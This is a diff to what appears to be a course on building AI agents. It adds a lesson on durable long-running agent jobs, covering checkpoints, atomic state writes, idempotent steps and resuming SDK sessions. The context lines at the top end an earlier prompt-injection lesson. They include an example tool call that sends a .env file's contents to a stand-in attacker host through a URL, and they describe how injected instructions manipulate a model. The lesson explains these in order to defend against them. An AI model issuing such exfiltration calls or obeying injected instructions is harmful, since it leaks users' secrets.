@@ -1114,3 +1114,59 @@ Remove any one leg and the attack can't work. That's the most useful design rule
 2. It's a probabilistic request to the same model that's being manipulated. Attackers iterate on phrasing until it works, and the model can't reliably tell data from instructions. Controls that live in code (hooks, allowlists, missing tools) hold no matter what the model decides.  
 3. Yes. WebFetch("https://evil.io/?q=<contents of .env>") leaks data through the URL itself. Close it with a domain allowlist in a PreToolUse hook on WebFetch, by denying WebFetch after reading sensitive files (taint), or by not giving it open web access at all.  
 
+## Day 27: Long-running agents - checkpoints, durable state, session resume  
+
+Real agents run for minutes/hours. Somewhere along the way a process can die.  
+If a crash means starting over, you pay twice in usage and you may repeat side effects, like logging an alert twice or placing order twice.  
+
+### Concept  
+```
+Conversation state  → the chat transcript (SDK session)
+                      resume=<session_id> reloads it
+Application state   → what you've actually DONE
+                      (your JSON / SQLite / DB)
+```  
+
+Rule #1: your own state file is the source of truth. A session is a handy way to keep the context going, but it isn't a ledger. Transcripts get compacted, get long and cost tokens to reload. They also can't tell you for sure whether a side effect finished.  
+
+What a durable agent job looks like:  
+```
+load state ──► for each work item:
+                 already done? → skip
+                 run agent step (resume session)
+                 side effect via tool
+                 CHECKPOINT (atomic write)
+             ──► crash anywhere → rerun = continue
+```  
+The key ideas:  
+- Checkpoint right after each side effect, not at the end of the run.  
+- Atomic writes: write file.tmp, then os.replace(). A crash in the middle of a write never leaves corrupt JSON behind.  
+- Idempotent steps (Day 3 again): doing a step twice must be harmless. Key your records by ticker or task ID so a retry overwrites instead of duplicating.  
+- Small work units: one ticker or one page per agent call. A crash then loses at most one unit.  
+
+SDK session tools (SDK 0.2.x):  
+- ResultMessage.session_id gives you the ID to store.  
+- ClaudeAgentOptions(resume=sid) continues that conversation.  
+- fork_session=True (with resume) branches off it and leaves the original untouched. Handy for "try another approach from here".  
+- continue_conversation=True picks up the most recent session in the cwd.  
+- list_sessions() and get_session_messages(sid) let you inspect old runs, which is useful for replay (Day 23).  
+- enable_file_checkpointing=True plus ClaudeSDKClient.rewind_files(...) undoes file edits the agent made. Use it when the agent edits code or files.  
+
+### What to look for:  
+in the second run the TSLA and MSFT reasons can mention earlier tickers ("unlike NVDA's overbought RSI…"). That's resume bringing back the conversation from before the crash. Your JSON, not the transcript, is what decides which tickers to skip.  
+
+Run it twice:  
+- CRASH_AFTER=2 python day27_durable.py reviews AAPL and NVDA, then "crashes". Open day27_state.json and you'll see two verdicts plus a session_id.  
+- python day27_durable.py prints skip AAPL, then skip NVDA, then reviews only TSLA and MSFT.  
+
+### Quiz  
+1. Your agent appends alerts to a list and you checkpoint once at the end of the run. It crashes on item 40 of 50. What two problems do you hit on rerun, and how do you fix each?  
+2. Why not just use resume and ask the agent "which tickers have you finished?" to decide what's left?  
+3. A nightly job has been resuming the same session for 3 weeks. What goes wrong, and what would you do instead?  
+
+### Answers
+1. (a) Every item since the last checkpoint is lost, so you redo up to 39 items and pay for them again. (b) If the side effects already went out (alerts sent), redoing them duplicates them. Fix: checkpoint right after each item, and make each step idempotent, keyed by item ID (overwrite, don't append), or check "already done?" before acting.  
+2. The transcript isn't a reliable ledger. The model can misremember, compaction can drop details, and a crash between the tool succeeding and the reply being saved leaves the transcript out of step with reality. Reloading the whole history to ask also costs tokens. Use deterministic code over your own state for control flow, and let the model handle judgment.  
+3. The context keeps growing. Each resume reloads more history, so cost and latency go up, compaction kicks in and old noise affects new decisions. Instead, start a fresh session each night (or per batch). Carry over only a small summary or the key facts from your state file in the prompt, the same distilled-memory idea as Day 12.  
+
+
